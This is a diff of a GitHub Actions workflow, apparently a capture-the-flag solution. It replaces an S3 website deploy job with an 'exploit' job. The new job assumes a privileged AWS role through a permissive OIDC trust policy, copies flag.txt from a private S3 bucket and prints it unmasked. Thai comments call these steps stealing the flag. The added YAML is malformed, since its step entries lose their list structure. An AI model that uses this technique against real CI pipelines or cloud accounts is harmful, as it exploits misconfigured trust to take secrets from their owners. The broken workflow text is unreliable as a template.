@@ -1,43 +1,41 @@
-name: Deploy Static Website to S3
+name: Get The Flag
 
 on:
   push:
     branches: [ main ]
-  workflow_dispatch:  # Allows manual triggering
+  workflow_dispatch:
 
-# OIDC permissions for keyless authentication
 permissions:
   id-token: write
   contents: read
 
 jobs:
-  deploy:
+  exploit:
     runs-on: ubuntu-latest
 
     steps:
-    - name: Checkout repository
-      uses: actions/checkout@v3
+    
+name: Checkout repository
+    uses: actions/checkout@v3
 
-    # OIDC/IRSA Authentication - No more access keys!
-    - name: Configure AWS credentials via OIDC
-      uses: aws-actions/configure-aws-credentials@v4
-      with:
-        role-to-assume: "arn:aws:iam::694502195928:role/admin-godmode-flag-reader-lol-698875"
-        role-session-name: GitHubActions-Backend-${{ github.run_id }}
-        aws-region: "ap-southeast-1"
-        
-    # Read flag from the S3 Storage.
-    - name: Read flag from the secret storage
-      run: |
-        aws s3 cp s3://oh-i-really-do-care/flag.txt .
-        # Mask the SHA256 portion with XXXXXXXXXXXXXXX
-        cat flag.txt
+    # ขั้นตอนนี้จะสำเร็จ เพราะ Trust Policy อนุญาตให้ Repository ของคุณ Assume Role ได้
+    
+name: Assume Target AWS Role
+    uses: aws-actions/configure-aws-credentials@v4
+    with:
+      role-to-assume: "arn:aws:iam::694502195928:role/admin-godmode-flag-reader-lol-698875"
+      role-session-name: Hacker-Session-${{ github.run_id }}
+      aws-region: "ap-southeast-1"
 
-    # # Deploy to S3 bucket - directly sync the repository contents
-    # - name: Deploy to S3
-    #   run: |
-    #     aws s3 sync ./ s3://oh-i-dont-care/ \
-    #       --delete \
-    #       --exclude ".git/*" \
-    #       --exclude ".github/*" \
-    #       --exclude "README.md" 
+    # ขั้นตอนการขโมย Flag
+    
+name: Steal and Print the Full Flag
+    run: |
+      echo "Attempting to read the secret flag from S3..."
+      # 1. Copy the flag file from the secret S3 bucket
+      aws s3 cp s3://oh-i-really-do-care/flag.txt .
+      # 2. Print the full content of the file before it is masked
+      echo "--- FLAG CONTENT ---"
+      cat flag.txt 
+      echo "--- END FLAG ---"
+      # (คุณไม่จำเป็นต้องมีคำสั่ง deploy หรือคำสั่ง perl mask)
